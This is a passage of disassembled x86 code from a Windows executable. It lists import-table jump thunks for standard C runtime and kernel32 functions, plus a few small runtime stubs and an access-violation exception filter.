jmp [ __setusermatherr@IAT ]
sub_413330
mov edi edi
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_413340
mov edi edi
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_413483
push 0x8
call sub_411145
add esp 0x4
retn
__set_app_type
jmp [ __set_app_type@IAT ]
_amsg_exit
jmp [ _amsg_exit@IAT ]
__getmainargs
jmp [ __getmainargs@IAT ]
_exit
jmp [ _exit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_cexit
jmp [ _cexit@IAT ]
exit
jmp [ exit@IAT ]
_CrtSetCheckCount
jmp [ _CrtSetCheckCount@IAT ]
sub_413849
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x28 ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
_CrtDbgReportW
jmp [ _CrtDbgReportW@IAT ]
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
_crt_debugger_hook
jmp [ _crt_debugger_hook@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
_controlfp_s
jmp [ _controlfp_s@IAT ]
_invoke_watson
jmp [ _invoke_watson@IAT ]
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
_except_handler4_common
jmp [ _except_handler4_common@IAT ]
EncodePointer
jmp [ EncodePointer@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
Sleep
jmp [ Sleep@IAT ]
InterlockedCompareExchange
jmp [ InterlockedCompareExchange@IAT ]
HeapSetInformation
jmp [ HeapSetInformation@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
LoadLibraryW
jmp [ LoadLibraryW@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
DecodePointer
jmp [ DecodePointer@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
